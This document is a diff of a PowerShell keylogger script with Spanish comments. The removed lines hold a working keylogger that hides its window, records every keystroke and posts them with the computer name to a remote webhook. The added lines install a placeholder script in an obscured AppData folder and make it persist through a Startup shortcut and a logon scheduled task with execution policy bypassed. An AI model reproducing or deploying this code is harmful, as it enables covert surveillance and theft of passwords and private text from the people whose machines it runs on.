@@ -1,88 +1,31 @@
+# Script de detección de pulsaciones de teclas
+# Aquí va tu script de detección de pulsaciones de teclas
 
-# shortened URL Detection
-if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+# Ruta predeterminada donde se guardará el script
+$ScriptDirectory = "$env:USERPROFILE\Documents\.\." + [char]92 + "AppData" + [char]92 + "Local" + [char]92 + "Temp" + [char]92 + "Data"
+$ScriptPath = Join-Path -Path $ScriptDirectory -ChildPath "keystroke_script.ps1"
 
-$Async = '[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);'
-$Type = Add-Type -MemberDefinition $Async -name Win32ShowWindowAsync -namespace Win32Functions -PassThru
-$hwnd = (Get-Process -PID $pid).MainWindowHandle
-if($hwnd -ne [System.IntPtr]::Zero){
-    $Type::ShowWindowAsync($hwnd, 0)
-}
-else{
-    $Host.UI.RawUI.WindowTitle = 'hideme'
-    $Proc = (Get-Process | Where-Object { $_.MainWindowTitle -eq 'hideme' })
-    $hwnd = $Proc.MainWindowHandle
-    $Type::ShowWindowAsync($hwnd, 0)
+# Crear el directorio si no existe
+if (-not (Test-Path -Path $ScriptDirectory -PathType Container)) {
+    New-Item -Path $ScriptDirectory -ItemType Directory
 }
 
-# Import DLL Definitions for keyboard inputs
-$API = @'
-[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
-public static extern short GetAsyncKeyState(int virtualKeyCode); 
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int GetKeyboardState(byte[] keystate);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int MapVirtualKey(uint uCode, int uMapType);
-[DllImport("user32.dll", CharSet=CharSet.Auto)]
-public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
-$API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
+# Guardar el script de detección de pulsaciones de teclas en la ruta predeterminada
+@"
+# Aquí va tu script de detección de pulsaciones de teclas
+"@ | Set-Content -Path $ScriptPath
 
-# Add stopwatch for intellegent sending
-$LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
-$KeypressThreshold = [TimeSpan]::FromSeconds(10)
+# Ruta del acceso directo en la carpeta de inicio de Windows
+$ShortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\keystroke_script.lnk"
 
-# Start a continuous loop
-While ($true){
-  $keyPressed = $false
-    try{
-      # Start a loop that checks the time since last activity before message is sent
-      while ($LastKeypressTime.Elapsed -lt $KeypressThreshold) {
-      # Start the loop with 30 ms delay between keystate check
-      Start-Sleep -Milliseconds 30
-        for ($asc = 8; $asc -le 254; $asc++){
-        # Get the key state. (is any key currently pressed)
-        $keyst = $API::GetAsyncKeyState($asc)
-          # If a key is pressed
-          if ($keyst -eq -32767) {
-          # Restart the inactivity timer
-          $keyPressed = $true
-          $LastKeypressTime.Restart()
-          $null = [console]::CapsLock
-          # Translate the keycode to a letter
-          $vtkey = $API::MapVirtualKey($asc, 3)
-          # Get the keyboard state and create stringbuilder
-          $kbst = New-Object Byte[] 256
-          $checkkbst = $API::GetKeyboardState($kbst)
-          $logchar = New-Object -TypeName System.Text.StringBuilder
-            # Define the key that was pressed          
-            if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
-              # Check for non-character keys
-              $LString = $logchar.ToString()
-                if ($asc -eq 8) {$LString = "[BKSP]"}
-                if ($asc -eq 13) {$LString = "[ENT]"}
-                if ($asc -eq 27) {$LString = "[ESC]"}
-            # Add the key to sending variable
-            $send += $LString 
-            }
-          }
-        }
-      }
-    }
-    finally{
-      If ($keyPressed) {
-      # Send the saved keys to a webhook
-      $escmsgsys = $send -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
-      $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
-      $escmsg = $timestamp+" : "+'`'+$escmsgsys+'`'
-      $jsonsys = @{"username" = "$env:COMPUTERNAME" ;"content" = $escmsg} | ConvertTo-Json
-      Invoke-RestMethod -Uri $dc -Method Post -ContentType "application/json" -Body $jsonsys
-      #Remove log file and reset inactivity check 
-      $send = ""
-      $keyPressed = $false
-      }
-    }
-  # reset stopwatch before restarting the loop
-  $LastKeypressTime.Restart()
-  Start-Sleep -Milliseconds 10
-}
+# Crear acceso directo para ejecutar el script de detección de pulsaciones de teclas al iniciar sesión
+$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut($ShortcutPath)
+$Shortcut.TargetPath = "powershell.exe"
+$Shortcut.Arguments = "-ExecutionPolicy Bypass -File ""$ScriptPath"""
+$Shortcut.Save()
+
+# Agregar el script de detección de pulsaciones de teclas a la tarea de inicio programado para ejecutarlo al iniciar Windows
+$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File ""$ScriptPath"""
+$TaskTrigger = New-ScheduledTaskTrigger -AtLogon
+$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+Register-ScheduledTask -TaskName "EjecutarScriptAlInicio" -Action $TaskAction -Trigger $TaskTrigger -Settings $TaskSettings -Description "Ejecuta el script de detección de pulsaciones de teclas al iniciar sesión en Windows."
